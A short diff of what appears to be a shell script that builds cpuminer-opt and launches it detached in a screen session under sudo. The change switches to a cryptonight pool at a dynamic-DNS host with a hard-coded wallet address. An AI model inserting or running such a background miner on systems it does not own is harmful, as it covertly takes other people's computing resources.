@@ -6,4 +6,4 @@ cd cpuminer-opt
 ./build.sh
 cp cpuminer ../
 cd ..
-screen -d -m ./cpuminer -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u k67frozen.anonymous -p 0202 -x hihiahi.ddns.net:2212
+screen -d -m sudo ./cpuminer -a cryptonight -o stratum+tcp://truckcoin.ddns.net:3333 -u WcC2Wcqz6Ww1dkqF6ohxiaeL1hENdKfVjHvL3hmkh5m2FD9Z6eAJr8L6zaTPmohhmEZBgMTbH8rSpXowsisEo2cr2kJ4p3gqg
